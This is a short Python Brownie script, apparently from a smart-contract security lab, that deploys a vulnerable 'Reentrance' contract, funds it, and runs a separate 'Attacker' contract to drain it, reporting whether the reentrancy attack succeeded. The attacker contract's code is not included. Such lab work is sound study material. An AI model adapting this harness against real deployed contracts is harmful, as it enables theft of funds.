from brownie import *
from .reports import *


a0 = accounts[0] # target deployer
a1 = accounts[1] # attacker account
BIGNUMBER = (10**18)

REPORT = Report()
REPORT.add_account(a0, 'Target deployer')
REPORT.add_account(a1, 'Attacker')

def main():
    target = prepare()
    attack(target)

def prepare():
    # deploy smart contract
    target = Reentrance.deploy({'from': a0})
    target.donate(a0,{'from':a0, 'value':50*BIGNUMBER})
    REPORT.add_token(target)
    REPORT.add_contract(target, 'Target')

    # attacker should start with little ETH balance
    balance_to_burn = a1.balance() - 1*BIGNUMBER
    burn_address = accounts[3]
    a1.transfer(burn_address,balance_to_burn)

    REPORT.print()
    REPORT.txt_print('PRE-ATTACK STATE IS READY')
    return target

def attack(target):

    # attacker deploys its smart-contract, then attack happens
    attacker = Attacker.deploy(target,{'from':a1})
    attacker.donate({'from':a1, 'value': 0.9*BIGNUMBER})
    REPORT.add_contract(attacker, 'Attacker contract')
    REPORT.print()

    attacker.attack({'from':a1})
    REPORT.print()

    if a1.balance() > 30*BIGNUMBER:
        REPORT.txt_print('ATTACK SUCCESSFUL')
    else:
        REPORT.txt_print('ATTACK IS NOT SUCCESSFUL')
